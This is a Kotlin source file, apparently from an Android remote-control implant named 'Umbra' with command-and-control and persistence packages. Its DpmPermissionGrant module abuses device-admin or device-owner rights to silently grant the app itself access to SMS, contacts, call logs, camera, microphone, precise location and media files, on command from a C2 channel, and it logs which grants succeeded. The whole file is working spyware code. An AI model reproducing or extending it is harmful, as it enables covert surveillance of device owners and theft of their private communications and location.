package org.umbra.core.modules

import android.app.admin.DevicePolicyManager
import android.content.ComponentName
import android.content.Context
import android.util.Log
import org.umbra.core.c2.Command
import org.umbra.core.core.UmbraResponse
import org.umbra.core.persistence.UmbraAdminReceiver
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext

/**
 * DpmPermissionGrant — uses DevicePolicyManager to silently grant runtime
 * permissions. Requires the app to be an active device admin (registered
 * via `adb shell dpm set-active-admin`).
 *
 * Path 1: If device owner or profile owner → setPermissionGrantState(GRANTED)
 *         directly grants the permission.
 *
 * Path 2: If just active admin → setPermissionPolicy(PERMISSION_GRANT_POLICY_GRANTED)
 *         sets the default policy to auto-grant, then re-request permissions.
 *
 * Transaction codes (from decompiled IDevicePolicyManager$Stub):
 *   tx=250: setPermissionPolicy(admin, callerPkg, int policy)
 *   tx=252: setPermissionGrantState(admin, callerPkg, pkg, perm, int state, RemoteCallback)
 *   tx=379: canAdminGrantSensorsPermissions
 *
 * PERMISSION_GRANT_STATE_DEFAULT = 0
 * PERMISSION_GRANT_STATE_DENIED  = 1
 * PERMISSION_GRANT_STATE_GRANTED = 2
 *
 * PERMISSION_POLICY_PROMPT  = 0
 * PERMISSION_POLICY_AUTO_GRANT = 1  (auto-grant new permissions)
 * PERMISSION_POLICY_AUTO_DENY  = 2
 */
object DpmPermissionGrant {

    private const val TAG = "Umbra.DpmGrant"

    // PERMISSION_GRANT_STATE_GRANTED = 2 (from AOSP DevicePolicyManager)
    private const val GRANT_STATE_GRANTED = 2

    // PERMISSION_POLICY_AUTO_GRANT = 1
    private const val POLICY_AUTO_GRANT = 1

    private val TARGET_PERMISSIONS = listOf(
        "android.permission.READ_SMS",
        "android.permission.RECEIVE_SMS",
        "android.permission.SEND_SMS",
        "android.permission.READ_CONTACTS",
        "android.permission.READ_CALL_LOG",
        "android.permission.READ_PHONE_STATE",
        "android.permission.CAMERA",
        "android.permission.RECORD_AUDIO",
        "android.permission.ACCESS_FINE_LOCATION",
        "android.permission.ACCESS_COARSE_LOCATION",
        "android.permission.READ_MEDIA_IMAGES",
        "android.permission.READ_MEDIA_VIDEO",
        "android.permission.READ_MEDIA_AUDIO",
        "android.permission.POST_NOTIFICATIONS",
    )

    suspend fun remove(context: Context, cmd: Command): UmbraResponse = withContext(Dispatchers.IO) {
        val dpm = context.getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
        val adminComponent = ComponentName(context, UmbraAdminReceiver::class.java)
        try {
            dpm.removeActiveAdmin(adminComponent)
            val active = dpm.isAdminActive(adminComponent)
            Log.d(TAG, "removeActiveAdmin called — still active: $active")
            UmbraResponse.ExploitResponse(
                target = "dpm",
                success = !active,
                findings = mapOf("admin_removed" to (!active).toString(), "still_active" to active.toString())
            )
        } catch (e: Exception) {
            Log.e(TAG, "removeActiveAdmin failed: ${e.message}")
            UmbraResponse.ErrorResponse("dpm_remove:${e.message}", "dpm")
        }
    }

    suspend fun grant(context: Context, cmd: Command): UmbraResponse = withContext(Dispatchers.IO) {
        val dpm = context.getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
        val adminComponent = ComponentName(context, UmbraAdminReceiver::class.java)

        Log.d(TAG, "=== DPM Permission Grant starting ===")
        Log.d(TAG, "Admin component: $adminComponent")

        // Check if we're an active admin
        val isAdminActive = dpm.isAdminActive(adminComponent)
        Log.d(TAG, "isAdminActive: $isAdminActive")

        if (!isAdminActive) {
            return@withContext UmbraResponse.ErrorResponse(
                "dpm:not_active_admin: Register with 'adb shell dpm set-active-admin org.umbra.core/.persistence.UmbraAdminReceiver'",
                "dpm_grant"
            )
        }

        // Check if we're device owner
        val isDeviceOwner = dpm.isDeviceOwnerApp(context.packageName)
        Log.d(TAG, "isDeviceOwner: $isDeviceOwner")

        val requested: List<String> = cmd.params["permissions"]
            ?.split(",")?.map { it.trim() }?.filter { it.isNotEmpty() }
            ?: TARGET_PERMISSIONS

        val pkgName = context.packageName
        val granted = mutableListOf<String>()
        val failed = mutableListOf<String>()
        val details = mutableListOf<String>()

        // ── Path 1: setPermissionGrantState (requires device owner or profile owner) ──
        if (isDeviceOwner) {
            Log.d(TAG, "Device owner — using setPermissionGrantState")
            for (perm in requested) {
                try {
                    val result = dpm.setPermissionGrantState(
                        adminComponent, pkgName, perm, GRANT_STATE_GRANTED
                    )
                    if (result) {
                        granted.add(perm)
                        Log.d(TAG, "GRANTED $perm via setPermissionGrantState")
                    } else {
                        failed.add(perm)
                        Log.w(TAG, "FAILED $perm via setPermissionGrantState")
                    }
                } catch (e: Exception) {
                    failed.add(perm)
                    Log.e(TAG, "Exception granting $perm: ${e.message}")
                }
            }
            details.add("device_owner_setPermissionGrantState: ${granted.size} granted")
        } else {
            // ── Path 2: setPermissionPolicy(AUTO_GRANT) for regular admin ──
            Log.d(TAG, "Regular admin — trying setPermissionPolicy(AUTO_GRANT)")
            try {
                dpm.setPermissionPolicy(adminComponent, POLICY_AUTO_GRANT)
                details.add("setPermissionPolicy(AUTO_GRANT): set")

                // Now try setPermissionGrantState — some OEMs allow it for regular admins
                for (perm in requested) {
                    try {
                        val result = dpm.setPermissionGrantState(
                            adminComponent, pkgName, perm, GRANT_STATE_GRANTED
                        )
                        if (result) {
                            granted.add(perm)
                            Log.d(TAG, "GRANTED $perm via setPermissionGrantState (admin)")
                        } else {
                            failed.add(perm)
                        }
                    } catch (e: Exception) {
                        failed.add(perm)
                        Log.e(TAG, "Exception granting $perm: ${e.message}")
                    }
                }
                details.add("admin_setPermissionGrantState: ${granted.size} granted")
            } catch (e: Exception) {
                details.add("setPermissionPolicy failed: ${e.message}")
                Log.e(TAG, "setPermissionPolicy failed: ${e.message}")
            }
        }

        // Check actual permission state
        val actuallyGranted = requested.filter {
            context.checkSelfPermission(it) == android.content.pm.PackageManager.PERMISSION_GRANTED
        }

        Log.d(TAG, "=== Done: ${actuallyGranted.size}/${requested.size} actually granted ===")

        UmbraResponse.PermissionGrantResponse(
            target_permissions = requested,
            granted = actuallyGranted,
            failed = requested.filter { it !in actuallyGranted },
            details = details.joinToString(" | ")
        )
    }
}
